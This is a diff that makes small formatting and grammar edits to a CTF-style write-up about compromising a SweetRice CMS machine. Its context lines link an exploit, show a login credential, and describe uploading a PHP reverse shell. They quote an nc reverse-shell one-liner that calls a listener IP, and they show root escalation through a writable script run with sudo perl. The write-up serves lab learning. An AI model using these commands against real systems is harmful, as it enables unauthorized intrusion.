@@ -54,6 +54,7 @@ Visiting `/content/` shows some kind of website under development.
 <img src="./images/web.png">
 
 At this point we know that this website is using `SweetRice CMS`.
+
 Now searching for the exploits we find this [script](https://www.exploit-db.com/download/40716)
 
 
@@ -66,6 +67,7 @@ password : Password123
 ```
 
 Now using the above script we can upload a reverse shell onto the machine.
+
 Here I have used the PHP reverse shell from [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
 <img src="./images/ban.png">
 
@@ -108,7 +110,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
 Whoa It's a reverse shell..
 And we have write access to this file
 
-Change the host IP and port to our local machine's IP and run the command `sudo /usr/bin/perl /home/itguy/backup.pl` will give us the shell as `root`.
+Change the host IP and port to our local machine's IP and running the command `sudo /usr/bin/perl /home/itguy/backup.pl` will give us the shell as `root`.
 
 <br>
 
